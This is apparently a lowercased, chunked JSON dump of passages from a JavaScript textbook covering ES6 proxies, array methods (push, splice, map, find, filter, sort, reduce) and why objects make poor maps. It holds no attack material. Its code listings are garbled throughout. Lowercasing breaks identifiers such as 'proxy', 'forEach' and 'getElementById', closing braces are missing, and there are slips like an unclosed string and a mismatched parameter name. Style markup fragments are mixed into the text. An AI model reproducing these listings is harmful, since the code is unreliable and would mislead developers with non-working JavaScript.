bold;\\\"}\",\"target\":\"[[{\\\"line\\\":14,\\\"ch\\\":12},{\\\"line\\\":14,\\\"ch\\\":63}]]\"}  !@%style%@!", "javascript-8.2.5.txt__3": "we also need to bracket the execution of the code with two new date().gettime() timestamps: one before we start executing the target code, and one after. their difference tells us how long the code took to perform. finally, we can compare the results by calling the measure function on both the proxied array and the standard array.", "javascript-8.2.5.txt__4": "on our machine, the results don't fare well for proxies. it turns out that in chrome, proxies are around 50 times slower; in firefox, they're about 20 times slower.", "javascript-8.2.txt__1": "8.2. using proxies to control access", "javascript-8.2.txt__2": "we can use proxies when we'd traditionally use getters and setters, such as for logging, data validation, and computed properties. but proxies are even more powerful. they allow us to easily add profiling and performance measurements to our code, autopopulate object properties in order to avoid pesky null exceptions, and to wrap host objects such as the dom in order to reduce cross-browser incompatibilities.", "javascript-8.2.txt__3": "note  proxies are introduced by es6. for current browser support, see http://mng.bz/9uem.  in javascript, we can create proxies by using the built-in proxy constructor. let's start simple, with a proxy that intercepts all attempts to read and write to properties of an object.  listing 8.7. creating proxies with the proxy constructor  const emperor = { name: \"komei\" };  #a  const representative = new proxy(emperor, {  #b  get: (target, key) => {  #c  report(\"reading \" + key + \" through a proxy\");  #c  return key in target ? target[key]  #c  : \"don't bother the emperor!\"  #c  },  #c  set: (target, key, value) => {  #c  report(\"writing \" + key + \" through a proxy\");  #c  target[key] = value;  #c  #c  });  assert(emperor.name === \"komei\", \"the emperor's name is komei\");  #d  assert(representative.name === \"komei\",  #d  \"we can get the name property through a proxy\");  #d  assert(emperor.nickname === undefined,  #e  \"the emperor doesn't have a nickname \");  #e  assert(representative.nickname === \"don't bother the emperor!\",  #f  \"the proxy jumps in when we make inproper requests\");  #f  representative.nickname = \"tenno\";  #g  assert(emperor.nickname === \"tenno\",  #g  \"the emperor now has a nickname\");  #g  assert(representative.nickname === \"tenno\",  #g  \"the nickname is also accessible through the proxy\");  #g  #a - the emperor is our target object.  #b - creates a proxy with the proxy constructor that takes in the object the proxy wraps...  #c - ...and an object with traps that will be called when reading (get) and writing (set) to properties.  #d - accesses the name property both through the emperor object and through the proxy object  #e - accessing a non-existing property directly on the object returns undefined.  #f - accessing a property through a proxy detects that the object doesn't exist in our target object, so a warning message is returned.  #g - adds a property through the proxy. the property is accessible both through the target object and through the proxy.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":1,\\\"ch\\\":23},{\\\"line\\\":1,\\\"ch\\\":32}]]\"}  !@%style%@!", "javascript-8.2.txt__4": "const representative = new proxy(emperor, {  get: (target, key) => {  report(\"reading \" + key + \" through a proxy\");  return key in target ? target[key]  : \"don't bother the emperor!\"  },  set: (target, key, value) => {  report(\"writing \" + key + \" through a proxy\");  target[key] = value;  });", "javascript-8.2.txt__5": "get: (target, key) => {  report(\"reading \" + key + \" through a proxy\");  return key in target ? target[key]  : \"don't bother the emperor!\"  next, we test that we can access the name property both directly through the target emperor object as well as through our proxy object:  assert(emperor.name === \"komei\", \"the emperor's name is komei\");  assert(representative.name === \"komei\",  \"we can get the name property through a proxy\");", "javascript-8.2.txt__6": "figure 8.4. accessing the name property directly (on the left) and indirectly, through a proxy (on the right)  note", "javascript-8.2.txt__7": "on the other hand, if we access a nonexisting nickname property directly on the target emperor object, we'll get, unsurprisingly, an undefined value. but if we try to access it through our proxy object, the get handler will be activated. because the target emperor object doesn't have a nickname property, the proxy's get trap will return the don't bother the emperor! message.", "javascript-8.2.txt__8": "we'll continue the example by assigning a new property through our proxy object: representative.nickname = \"tenno\". because the assignment is done through a proxy, and not directly, the set trap, which logs a message and assigns a property to our target emperor object, is activated:  set: (target, key, value) => {  report(\"writing \" + key + \" through a proxy\");  target[key] = value;  naturally, the newly created property can be accessed both through the proxy object and the target object:  assert(emperor.nickname === \"tenno\",  \"the emperor now has a nickname\");  assert(representative.nickname === \"tenno\",  \"the nickname is also accessible through the proxy\");  this is the gist of how to use proxies: through the proxy constructor, we create a proxy object that controls access to the target object by activating certain traps, whenever an operation is performed directly on a proxy.  in this example, we've used the get and set traps, but many other built-in traps allow us to define handlers for various object actions (see http://mng.bz/ba55). for example:  the apply trap will be activated when calling a function, and the construct trap when using the new operator.  the get and set traps will be activated when reading/writing to a property.  the enumerate trap will be activated for for-in statements.  getprototypeof and setprototypeof will be activated for getting and setting the prototype value.  we can intercept many operations, but going through all of them is outside the scope of this book. for now, we turn our attention to a few operations that we can't override: equality (== or ===), instanceof, and the typeof operator.", "javascript-9.1.1.txt__1": "9.1.1. creating arrays  there are two fundamental ways to create new arrays:  using the built-in array constructor  using array literals []  let's start with a simple example in which we create an array of ninjas and an array of samurai.  listing 9.1. creating arrays  const ninjas = [\"kuma\", \"hattori\", \"yagyu\"];  #a  const samurai = new array(\"oda\", \"tomoe\");  #b  assert(ninjas.length === 3, \"there are three ninjas\");  #c  assert(samurai.length === 2, \"and only two samurai\");  #c  assert(ninjas[0] === \"kuma\", \"kuma is the first ninja\");  #d  assert(samurai[samurai.length-1] === \"tomoe\",  #d  \"tomoe is the last samurai\");  #d  assert(ninjas[4] === undefined,  #e  \"we get undefined if we try to access an out of bounds index\");  #e  ninjas[4] = \"ishi\";  #f  assert(ninjas.length === 5,  #f  \"arrays are automatically expanded\");  #f  ninjas.length = 2;  #g  assert(ninjas.length === 2, \"there are only two ninjas now\");  #g  assert(ninjas[0] === \"kuma\" && ninjas[1] === \"hattori\",  #g  \"kuma and hattori\");  #g  assert(ninjas[2] === undefined, \"but we've lost yagyu\");  #g  #a - to create an array, we can use an array literal [] \u2026  #b - \u2026 or the built-in array constructor.  #c - the length property tells us the size of the array.  #d - we access array items with index notation: the first item is indexed with 0, and the last with array.length \u2013 1.  #e - reading items outside the array bounds results in undefined.  #f - writing to indexes outside the array bounds extends the array.  #g -manually overriding the length property with a lower value deletes the excess items.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in listing 9.1, we start by creating two arrays. the ninjas array is created with a simple array literal:  const ninjas = [\"kuma\", \"hattori\", \"yagyu\"];  it's immediately prefilled with three ninjas: kuma, hattori, and yagyu. the samurai array is created using the built-in array constructor:  const samurai = new array(\"oda\", \"tomoe\");  array literals versus the array constructor", "javascript-9.1.1.txt__2": "regardless of how we create it, each array has a length property that specifies the size of the array. for example, the length of the ninjas array is 3, and it contains 3 ninjas. we can test this with the following assertions:  assert(ninjas.length === 3, \"there are three ninjas\");  assert(samurai.length === 2, \"and only two samurai\");", "javascript-9.1.1.txt__3": "assert(ninjas[4] === undefined,  \"we get undefined if we try to access an out of bounds index\");  this behavior is a consequence of the fact that javascript arrays are objects. just as we'd get undefined if we tried to access a nonexistent object property, we get undefined when accessing a nonexistent array index.  on the other hand, if we try to write to a position outside of array bounds, as in  ninjas[4] = \"ishi\";  the array will expand to accommodate the new situation. for example, see figure 9.1: we've essentially created a hole in the array, and the item at index 3 is undefined. this also changes the value of the length property, which now reports a value of 5, even though one array item is undefined.  figure 9.1. writing to an array index outside of array bounds expands the array.", "javascript-9.1.2.txt__1": "9.1.2. adding and removing items at either end of an array  let's start with the following simple methods we can use to add items to and remove items from an array:  push adds an item to the end of the array.  unshift adds an item to the beginning of the array.  pop removes an item from the end of the array.  shift removes an item from the beginning of the array.  you've probably already used these methods, but just in case, let's make sure we're on the same page by exploring the following listing.  listing 9.2. adding and removing array items  const ninjas = [];  #a  assert(ninjas.length === 0, \"an array starts empty\");  #a  ninjas.push(\"kuma\");  #b  assert(ninjas[0] === \"kuma\",  #b  \"kuma is the first item in the array\");  #b  assert(ninjas.length === 1, \"we have one item in the array\");  #b  ninjas.push(\"hattori\");  #c  assert(ninjas[0] === \"kuma\",  #c  \"kuma is still first\");  #c  assert(ninjas[1] === \"hattori\",  #c  \"hattori is added to the end of the array\");  #c  assert(ninjas.length === 2,  #c  \"we have two items in the array!\");  #c  ninjas.unshift(\"yagyu\");  #d  assert(ninjas[0] === \"yagyu\",  #d  \"now yagyu is the first item\");  #d  assert(ninjas[1] === \"kuma\",  #d  \"kuma moved to the second place\");  #d  assert(ninjas[2] === \"hattori\",  #d  \"and hattori to the third place\");  #d  assert(ninjas.length === 3,  #d  \"we have three items in the array!\");  #d  const lastninja = ninjas.pop();  #e  assert(lastninja === \"hattori\",  #e  \"we've removed hattori from the end of the array\");  #e  assert(ninjas[0] === \"yagyu\",  #e  \"now yagyu is still the first item\");  #e  assert(ninjas[1] === \"kuma,  #e  \"kuma is still in second place\");  #e  assert(ninjas.length === 2,  #e  \"now there are two items in the array\");  #e  const firstninja = ninjas.shift();  #f  assert(firstninja === \"yagyu\",  #f  \"we've removed yagyu from the beginning of the array\");  #f  assert(ninjas[0] === \"kuma\",  #f  \"kuma has shifted to the first place\");  #f  assert(ninjas.length === 1,  #f  \"there's only one ninja in the array\");  #f  #a - creates a new, empty array  #b - pushes a new item to the end of the array  #c - pushes another item to the end of the array  #d - uses the built-in unshift method to insert the item at the beginning of the array. other items are adjusted accordingly.  #e - pops the last item from the array  #f - removes the first item from the array. other items are moved to the left accordingly.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we first create a new, empty ninjas array:  ninjas = [] // ninjas: []  in each array, we can use the built-in push method to append an item to the end of the array, changing its length in the process:  ninjas.push(\"kuma\"); // ninjas: [\"kuma\"];  ninjas.push(\"hattori\"); // ninjas: [\"kuma\", \"hattori\"];  we can also add new items to the beginning of the array by using the built in unshift method:  ninjas.unshift(\"yagyu\");// ninjas: [\"yagyu\", \"kuma\", \"hattori\"];  notice how existing array items are adjusted. for example, before calling the unshift method, \"kuma\" was at index 0, and afterward it's at index 1.  we can also remove elements from either the end or the beginning of the array. calling the built-in pop method removes an element from the end of the array, reducing the array's length in the process:  var lastninja = ninjas.pop(); // ninjas:[\"yagyu\", \"kuma\"]  // lastninja: \"hattori\"  we can also remove an item from the beginning of the array by using the built-in shift method:  var firstninja = ninjas.shift(); //ninjas: [\"kuma\"]  //firstninja: \"yagyu\"  figure 9.2 shows how push, pop, shift, and unshift modify arrays.  figure 9.2. the push and pop methods modify the end of an array, whereas shift and unshift modify the array's beginning.  performance considerations: pop and push versus shift and unshift", "javascript-9.1.3.txt__1": "9.1.3. adding and removing items at any array location  the previous example removed items from the beginning and end of the array. but this is too constraining\u2014in general, we should be able to remove items from any array location. one straightforward approach for doing this is shown in the following listing.  listing 9.3. na\u00efve way to remove an array item  const ninjas = [\"yagyu\", \"kuma\", \"hattori\", \"fuma\"];  delete ninjas[1];  #a  assert(ninjas.length === 4,  #b  \"length still reports that there are 4 items\");  #b  #b  assert(ninjas[0] === \"yagyu\", \"first item is yagyu\");  #b  assert(ninjas[1] === undefined, \"we've simply created a hole\");  #b  assert(ninjas[2] === \"hattori\", \"hattori is still the third item\");  #b  assert(ninjas[3] === \"fuma\", \"and fuma is the last item\");  #b  #a - uses the delete command to delete an item  #b - we deleted an item, but the array still reports that it has 4 items. we've only created a hole in the array.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  this approach to deleting an item from an array doesn't work. we effectively only create a hole in the array. the array still reports that it has four items, but one of them\u2014the one we wanted to delete\u2014is undefined (see figure 9.3).  figure 9.3. deleting an item from an array creates a hole in the array.  similarly, if we wanted to insert an item at an arbitrary position, where would we even start? as an answer to these problems, all javascript arrays have access to the splice method: starting from a given index, this method removes and inserts items. check out the following example.  listing 9.4. removing and adding items at arbitrary positions  const ninjas = [\"yagyu\", \"kuma\", \"hattori\", \"fuma\"];  #a  var removeditems = ninjas.splice(1, 1);  #b  assert(removeditems.length === 1, \"one item was removed\");  #c  assert(removeditems[0] === \"kuma\");  #c  assert(ninjas.length === 3,  #d  \"there are now three items in the array\");  #d  assert(ninjas[0] === \"yagyu\",  #d  \"the first item is still yagyu\");  #d  assert(ninjas[1] === \"hattori\",  #d  \"hattori is now in the second place\");  #d  assert(ninjas[2] === \"fuma\",  #d  \"and fuma is in the third place\");  #d  removeditems = ninjas.splice(1, 2, \"mochizuki\", \"yoshi\", \"momochi\");  #e  assert(removeditems.length === 2, \"now, we've removed two items\");  #e  assert(removeditems[0] === \"hattori\", \"hattori was removed\");  #e  assert(removeditems[1] === \"fuma\", \"fuma was removed\");  #e  assert(ninjas.length === 4, \"we've inserted some new items\");  #e  assert(ninjas[0] === \"yagyu\", \"yagyu is still here\");  #e  assert(ninjas[1] === \"mochizuki\", \"mochizuki also\");  #e  assert(ninjas[2] === \"yoshi\", \"yoshi also\");  #e  assert(ninjas[3] === \"momochi\", \"and momochi\");  #e  #a - creates a new array with four items  #b - uses the built-in splice method to remove one element, starting at index 1  #c - splice returns an array of the removed items. in this case, we removed one item.  #d - the ninja array no longer contains kuma; subsequent items were automatically shifted.  #e - we can insert an element at a position by adding arguments to the splice call.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we begin by creating a new array with four items:  var ninjas = [\"yagyu\", \"kuma\", \"hattori\", \"fuma\"];  then we call the built-in splice method:  var removeditems = ninjas.splice(1,1);//ninjas:[\"yagyu\",\"hattori\", \"fuma\"];  //removeditems: [\"kuma\"]", "javascript-9.1.4.txt__1": "9.1.4. common operations on arrays  in this section, we'll explore some of the most common operations on arrays:  iterating (or traversing) through arrays  mapping existing array items to create a new array based on them  testing array items to check whether they satisfy certain conditions  finding specific array items  aggregating arrays and computing a single value based on array items (for example, calculating the sum of an array)  we'll start with the basics: array iterations.  iterating over arrays  one of the most common operations is iterating over an array. going back to computer science 101, an iteration is most often performed in the following way:  const ninjas = [\"yagyu\", \"kuma\", \"hattori\"];  for(let i = 0; i < ninjas.length; i++){  assert(ninjas[i] !== null, ninjas[i]);  #a  #a - reports the value of each ninja  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":36}]]\"}  !@%style%@!  this example is as simple as it looks. it uses a for loop to check every item in the array; the results are shown in figure 9.4.  figure 9.4. the output of checking the ninjas with a for loop  you've probably written something like this so many times that you don't even have to think about it anymore. but just in case, let's take a closer look at the for loop.", "javascript-9.1.4.txt__2": "to make life easier, all javascript arrays have a built-in foreach method we can use in such situations. look at the following example.  listing 9.5. using the foreach method  const ninjas = [\"yagyu\", \"kuma\", \"hattori\"];  ninjas.foreach(ninja => {  #a  assert(ninja !== null, ninja);  #a  ));  #a  #a - uses the built-in foreach method to iterate over the array  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":2,\\\"ch\\\":7},{\\\"line\\\":2,\\\"ch\\\":14}],[{\\\"line\\\":6,\\\"ch\\\":23},{\\\"line\\\":6,\\\"ch\\\":30}],[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":63}]]\"}  !@%style%@!", "javascript-9.1.4.txt__3": "we'll continue by taking things up a notch and seeing how we can map arrays to other arrays.  mapping arrays  imagine that you have an array of ninja objects. each ninja has a name and a favorite weapon, and you want to extract an array of weapons from the ninjas array. armed with the knowledge of the foreach method, you might write something like the following listing.  listing 9.6. na\u00efve extraction of a weapons array  const ninjas = [  {name: \"yagyu\", weapon: \"shuriken\"},  {name: \"yoshi\", weapon: \"katana\"},  {name: \"kuma\", weapon: \"wakizashi\"}  ];  const weapons = [];  #a  ninjas.foreach(ninja => {  #a  weapons.push(ninja.weapon);  #a  });  #a  assert(weapons[0] === \"shuriken\"  && weapons[1] === \"katana\"  && weapons[2] === \"wakizashi\"  && weapons.length === 3,  \"the new array contains all weapons\");  #a - creates a new array and uses a foreach loop over ninjas to extract individual ninja weapons  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":19}],[{\\\"line\\\":7,\\\"ch\\\":0},{\\\"line\\\":7,\\\"ch\\\":25}],[{\\\"line\\\":8,\\\"ch\\\":2},{\\\"line\\\":8,\\\"ch\\\":29}],[{\\\"line\\\":9,\\\"ch\\\":0},{\\\"line\\\":9,\\\"ch\\\":3}],[{\\\"line\\\":17,\\\"ch\\\":0},{\\\"line\\\":17,\\\"ch\\\":96}]]\"}  !@%style%@!  this isn't all that bad: we create a new, empty array, and use the foreach method to iterate over the ninjas array. then, for each ninja object, we add the current weapon to the weapons array.", "javascript-9.1.4.txt__4": "listing 9.7. mapping an array  const ninjas = [  {name: \"yagyu\", weapon: \"shuriken\"},  {name: \"yoshi\", weapon: \"katana\"},  {name: \"kuma\", weapon: \"wakizashi\"}  ];  const weapons = ninjas.map(ninja => ninja.weapon);  #a  assert(weapons[0] === \"shuriken\"  && weapons[1] === \"katana\"  && weapons[2] === \"wakizashi\"  && weapons.length == 3, \"the new array contains all weapons\");  #a - the built-in map method takes a function that's called for each item in the array.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":50}],[{\\\"line\\\":13,\\\"ch\\\":0},{\\\"line\\\":13,\\\"ch\\\":87}]]\"}  !@%style%@!", "javascript-9.1.4.txt__5": "figure 9.5. the map function calls the provided callback function (fc) on each array item, and creates a new array with callback return values.  now that we know how to map arrays, let's see how to test array items for certain conditions.  testing array items", "javascript-9.1.4.txt__6": "listing 9.8. testing arrays with the every and some methods  const ninjas = [  {name: \"yagyu\", weapon: \"shuriken\"},  {name: \"yoshi\" },  {name: \"kuma\", weapon: \"wakizashi\"}  ];  const allninjasarenamed = ninjas.every(ninja => \"name\" in ninja);  #a  const allninjasarearmed = ninjas.every(ninja => \"weapon\" in ninja);  #a  assert(allninjasarenamed, \"every ninja has a name\");  assert(!allninjasarearmed, \"but not every ninja is armed\");  const someninjasarearmed = ninjas.some(ninja => \"weapon\" in ninja);  #b  assert(someninjasarearmed, \"but some ninjas are armed\");  #b  #a - the built-in every method takes a callback that's called for each array item. it returns true if the callback returns a true value for all array items, or false otherwise.  #b - the built-in some method also takes a callback. it returns true if the callback returns a true value for at least one array item, or false otherwise.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":15,\\\"ch\\\":0},{\\\"line\\\":15,\\\"ch\\\":139}]]\"}  !@%style%@!  listing 9.8 shows an example where we have a collection of ninja objects but are unsure of their names and whether all of them are armed. to get to the root of this problem, we first take advantage of every:  var allninjasarenamed = ninjas.every(ninja => \"name\" in ninja);  the every method takes a callback that, for each ninja in the collection, checks whether we know the ninja's name. every returns true only if the passed-in callback returns true for every item in the array. figure 9.6 shows how every works.  figure 9.6. the every method tests whether all items in an array satisfy a certain condition represented by a callback.  in other cases, we only care whether some array items satisfy a certain condition. for these situations, we can use the built-in method some:  const someninjasarearmed = ninjas.some(ninja => \"weapon\" in ninja);  starting from the first array item, some calls the callback on each array item until an item is found for which the callback returns a true value. if such an item is found, the return value is true; if not, the return value is false.  figure 9.7 shows how some works under the hood: we search an array in order to find out whether some or all of its items satisfy a certain condition. next we'll explore how to search an array to find a particular item.  figure 9.7. the some method checks whether at least one array item satisfies a condition represented by the passed-in callback.  searching arrays  another common operation that you're bound to use, sooner rather than later, is finding items in an array. again, this task is greatly simplified with another built-in array method: find. let's study the following listing.  note  the built-in find method is part of the es6 standard. for current browser compatibility, see http://mng.bz/u532.  listing 9.9. finding array items  const ninjas = [  {name: \"yagyu\", weapon: \"shuriken\"},  {name: \"yoshi\" },  {name: \"kuma\", weapon: \"wakizashi\"}  ];  const ninjawithwakizashi = ninjas.find(ninja => {  return ninja.weapon === \"wakizashi\";  #a  });  assert(ninjawithwakizashi.name === \"kuma\"  && ninjawithwakizashi.weapon === \"wakizashi\",  \"kuma is wielding a wakizashi\");  const ninjawithkatana = ninjas.find(nina => {  return ninja.weapon === \"katana\";  #b  });  assert(ninjawithkatana === undefined,  \"we couldn't find a ninja that wields a katana\");  const armedninjas = ninjas.filter(ninja => \"weapon\" in ninja);  #c  assert(armedninjas.length === 2, \"there are two armed ninjas:\");  assert(armedninjas[0].name === \"yagyu\"  && armedninjas[1].name === \"kuma\", \"yagyu and kuma\");  #a - uses the find method to find the first array item that satisfies a certain condition, represented by a passed-in callback.  #b - the find method returns undefined if an item can't be found.  #c - use the filter method to find multiple items that all satisfy a certain condition.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  it's easy to find an array item that satisfies a certain condition: we use the built-in find method, passing it a callback that's invoked for each item in the collection until the targeted item is found. this is indicated by the callback returning true. for example, the expression  ninjas.find(ninja => ninja.weapon === \"wakizashi\");  finds kuma, the first ninja in the ninjas array that's wielding a wakizashi.  if we've gone through the entire array without a single item returning true, the final result of the search is undefined. for example, the code  ninjawithkatana = ninjas.find(ninja => ninja.weapon === \"katana\");  returns undefined, because there isn't a katana-wielding ninja. figure 9.8 shows the inner workings of the find function.  figure 9.8. the find function finds one item in an array: the first item for which the find callback returns true.  if we need to find multiple items satisfying a certain criterion, we can use the filter method, which creates a new array containing all the items that satisfy that criterion. for example, the expression  const armedninjas = ninjas.filter(ninja => \"weapon\" in ninja);  creates a new armedninjas array that contains only ninjas with a weapon. in this case, poor unarmed yoshi is left out. figure 9.9 shows how the filter function works.  figure 9.9. the filter function creates a new array that contains all items for which the callback returns true.  throughout this example, you've seen how to find particular items in an array, but in many cases it might also be necessary to find the index of an item. let's take a closer look, with the following example.  listing 9.10. finding array indexes  const ninjas = [\"yagyu\", \"yoshi\", \"kuma\", \"yoshi\"];  assert(ninjas.indexof(\"yoshi\") === 1, \"yoshi is at index 1\");  assert(ninjas.lastindexof(\"yoshi\") === 3, \"and at index 3\");  const yoshiindex = ninjas.findindex(ninja => ninja === \"yoshi\");  assert(yoshiindex === 1, \"yoshi is still at index 1\");  to find the index of a particular item, we use the built-in indexof method, passing it the item whose index we want to find:  ninjas.indexof(\"yoshi\")  in cases where a particular item can be found multiple times in an array (as is the case with \"yoshi\" and the ninjas array), we may also be interested in finding the last index where yoshi appears. for this, we can use the lastindexof method:  ninjas.lastindexof(\"yoshi\")  finally, in the most-general case, when we don't have a reference to the exact item whose index we want to search for, we can use the findindex method:  const yoshiindex = ninjas.findindex(ninja => ninja === \"yoshi\");  the findindex method takes a callback and returns the index of the first item for which the callback returns true. in essence, it works a lot like the find method, the only difference being that find returns a particular item, whereas findindex returns the index of that item.  sorting arrays", "javascript-9.1.4.txt__7": "array.sort((a, b) => a \u2013 b);  the javascript engine implements the sorting algorithm. the only thing we have to provide is a callback that informs the sorting algorithm about the relationship between two array items. the possible results are as follows:  if a callback returns a value less than 0, then item a should come before item b.  if a callback returns a value equal to 0, then items a and b are on equal footing (as far as the sorting algorithm is concerned, they're equal).  if a callback returns a value greater than 0, then item a should come after item b.  figure 9.10 shows the decisions made by the sorting algorithm depending on the callback return value.  figure 9.10. if the call-back returns a value less than 0, the first item should come before the second. if the callback returns 0, both items should be left as is. and if the return value is greater than 0, the first item should come after the second item.  and that's about all you need to know about the sorting algorithm. the actual sorting is performed behind the scenes, without us having to manually move array items around. let's look at a simple example.  listing 9.11. sorting an array  const ninjas = [{name: \"yoshi\"}, {name: \"yagyu\"}, {name: \"kuma\"}];  ninjas.sort(function(ninja1, ninja2){  #a  if(ninja1.name < ninja2.name) { return -1; }  #a  if(ninja1.name > ninja2.name) { return 1; }  #a  #a  return 0;  #a  });  #a  assert(ninjas[0].name === \"kuma\", \"kuma is first\");  assert(ninjas[1].name === \"yagyu\", \"yagyu is second\");  assert(ninjas[2].name === \"yoshi\", \"yoshi is third\");  #a - passes a callback to the built-in sort method to specify a sorting order  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":13,\\\"ch\\\":0},{\\\"line\\\":13,\\\"ch\\\":77}]]\"}  !@%style%@!  in listing 9.11 we have an array of ninja objects, where each ninja has a name. our goal is to sort that array lexicographically (in alphabetical order), according to ninja names. for this, we naturally use the sort function:  ninjas.sort(function(ninja1, ninja2){  if(ninja1.name < ninja2.name) { return -1; }  if(ninja1.name > ninja2.name) { return 1; }  return 0;  });", "javascript-9.1.4.txt__8": "that's about it! the rest of the nitty-gritty details of sorting are left to the javascript engine, without us having to worry about them.  aggregating array items  how many times have you written code like the following?  const numbers = [1, 2, 3, 4];  const sum = 0;  numbers.foreach(number => {  sum += number;  });  assert(sum === 10, \"the sum of first four numbers is 10\");  this code has to visit every item in a collection and aggregate some value, in essence reducing the entire array to a single value. don't worry\u2014javascript has something to help with this situation, too: the reduce method, as shown in the following example.  listing 9.12. aggregating items with reduce  const numbers = [1, 2, 3, 4];  const sum = numbers.reduce((aggregated, number) =>  #a  aggregated + number, 0);  #a  assert(sum === 10, \"the sum of first four numbers is 10\");  #a - uses reduce to accumulate a single value from an array  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":2,\\\"ch\\\":12},{\\\"line\\\":2,\\\"ch\\\":50}],[{\\\"line\\\":7,\\\"ch\\\":0},{\\\"line\\\":7,\\\"ch\\\":59}]]\"}  !@%style%@!", "javascript-9.1.4.txt__9": "figure 9.11. the reduce function applies a callback to an aggregated value and each item in an array to reduce the array to a single value.", "javascript-9.1.5.txt__1": "9.1.5. reusing built-in array functions", "javascript-9.1.5.txt__2": "one option may be to create a new array every time you wish to create a new version of such an object, and add the metadata properties and methods to it. remember, we can add properties and methods to an object as we please, including arrays. generally, however, this can be slow, not to mention tedious.", "javascript-9.1.5.txt__3": "let's examine the possibility of using a normal object and giving it the functionality we desire. methods that know how to deal with collections already exist on the array object; can we trick them into working on our own objects? turns out that we can, as shown in the following listing.  listing 9.13. simulating array-like methods  <body>  <input id=\"first\"/>  <input id=\"second\"/>  <script>  const elems = {  length: 0,  #a  add: function(elem){  #b  array.prototype.push.call(this, elem);  #b  },  #b  gather: function(id){  #c  this.add(document.getelementbyid(id));  #c  },  #c  find: function(callback){  #d  return array.prototype.find.call(this, callback);  #d  #d  };  elems.gather(\"first\");  assert(elems.length === 1 && elems[0].nodetype,  \"verify that we have an element in our stash\");  elems.gather(\"second\");  assert(elems.length === 2 && elems[1].nodetype,  \"verify the other insertion\");  elems.find(elem => elem.id === \"second\");  assert(found && found.id === \"second\",  \"we've found our element\");  </script>  </body>  #a - stores the count of elements. the array needs a place to store the number of items it's storing.  #b - implements the method to add elements to a collection. the prototype for array has a method to do this, so why not use it instead of reinventing the wheel?  #c - implements the gather method to find elements by their id values and add them to the collection  #d - implements the method to find elements in the collection. similar to the add method, it reuses the existing find method accessible to arrays.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-9.1.5.txt__4": "add: function(elem){  array.prototype.push.call(this, elem);  rather than write our own code, we can use a native method of javascript arrays: array.prototype.push.", "javascript-9.1.txt__1": "9.1. arrays", "javascript-9.1.txt__2": "but as with many things in javascript, arrays come with a twist: they're just objects. although this leads to some unfortunate side effects, primarily in terms of performance, it also has some benefits. for example, arrays can access methods, like other objects\u2014methods that will make our lives a lot easier.", "javascript-9.2.1.txt__1": "9.2.1. don't use objects as maps  imagine that somewhere on our site we need to access the translation for the word constructor, so we extend the dictionary example into the following code.  listing 9.14. objects have access to properties that weren't explicitly defined  we try to access the translation for the word constructor\u2014a word that we foolishly forgot to define in our dictionary. normally, in such a case, we'd expect the dictionary to return undefined. but that isn't the result, as you can see in figure 9.12.  figure 9.12. running listing 9.14 shows that objects aren't good maps, because they have access to properties that weren't explicitly defined (through their prototypes).  as you can see, by accessing the constructor property, we obtain the following string:  \"function object() { [native code] }\"", "javascript-9.2.1.txt__2": "in addition, with objects, keys can only be string values; if you want to create a mapping for any other value, that value will be silently converted into a string without anyone asking you anything! for example, imagine that we want to track some information about html nodes, as in the following listing.", "javascript-9.2.1.txt__3": "listing 9.15. mapping values to html nodes with objects  <div id=\"firstelement\"></div>  #a  <div id=\"secondelement\"></div>  #a  <script>  #a  const firstelement = document.getelementbyid(\"firstelement\");  #a  const secondelement = document.getelementbyid(\"secondelement\"); #a  const map = {};  #b  map[firstelement] = { data: \"firstelement\"};  #c  assert(map[firstelement].data === \"firstelement\",  #c  \"the first element is correctly mapped\");  #c  map[secondelement] = { data: \"secondelement\"};  #d  assert(map[secondelement].data === \"secondelement\",  #d  \"the second element is correctly mapped\");  #d  assert(map[firstelement].data === \"firstelement\",  #e  \"but now the firstelement is overriden!\");  #e  </script>  #a - defines two html elements and fetches them by using the built-in document.getelementbyid method  #b - defines an object that we'll use as a map to store additional information about our html elements  #c - stores information about the first element, and checks that it was correctly stored  #d - stores information about the second element, and checks that it was correctly stored  #e - the mapping for the first element is now invalid!  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in listing 9.15, we create two html elements, firstelement and secondelement, which we then fetch from the dom by using the document.getelementbyid method. in order to create a mapping that will store additional information about each element, we define a plain old javascript object:  const map = {};  then we use the html element as a key for our mapping object and associate some data with it:  map[firstelement] = { data: \"firstelement\"}  and we check that we can retrieve that data. because that works as it should, we repeat the entire process for the second element:  map[secondelement] = { data: \"secondelement\"};  again, everything looks hunky dory; we've successfully associated some data with our html element. but a problem occurs 